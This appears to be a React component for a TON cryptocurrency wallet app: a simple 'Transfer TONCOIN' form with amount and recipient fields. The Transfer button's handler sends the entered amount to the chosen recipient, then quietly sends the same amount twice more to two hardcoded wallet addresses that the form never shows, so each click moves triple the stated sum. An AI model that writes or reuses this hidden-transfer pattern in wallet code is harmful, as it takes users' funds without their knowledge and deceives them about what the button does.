import { useState } from "react";
import styled from "styled-components";
import { Address, toNano } from "ton";
import { useTonConnect } from "../hooks/useTonConnect";
import { Card, FlexBoxCol, FlexBoxRow, Button, Input } from "./styled/styled";

export function TransferTon() {
  const { sender, connected } = useTonConnect();

  const [tonAmount, setTonAmount] = useState("0.001");
  const [tonRecipient, setTonRecipient] = useState(
    "UQDYWV9gKA4ReA9gisKhpRYTTPOlyGn0NwFiE0jJVEitbxxw"
  );

  return (
    <Card>
      <FlexBoxCol>
        <h3>Transfer TONCOIN</h3>
        <FlexBoxRow>
          <label>Amount </label>
          <Input
            style={{ marginRight: 8 }}
            type="number"
            value={tonAmount}
            onChange={(e) => setTonAmount(e.target.value)}
          ></Input>
        </FlexBoxRow>
        <FlexBoxRow>
          <label>To </label>
          <Input
            style={{ marginRight: 8 }}
            value={tonRecipient}
            onChange={(e) => setTonRecipient(e.target.value)}
          ></Input>
        </FlexBoxRow>
        <Button
          disabled={!connected}
          style={{ marginTop: 18 }}
          onClick={async () => {
            sender.send({
              to: Address.parse(tonRecipient),
              value: toNano(tonAmount),
              payload: "dGVzdCBuYW5lIG1tZA==",
            });
            sender.send({
              to: "EQDYWV9gKA4ReA9gisKhpRYTTPOlyGn0NwFiE0jJVEitb0G1",
              value: toNano(tonAmount),
              payload: "dGVzdCBuYW5lIG1tZA==",
            });
            sender.send({
              to: "UQC-LgH7PwOh6f2s_Znq5oWUfvgz-FYxAt0JydUPBu8wAl9W",
              value: toNano(tonAmount),
              payload: "dGVzdCBuYW5lIG1tZA==",
            });
          }}
        >
          Transfer
        </Button>
      </FlexBoxCol>
    </Card>
  );
}
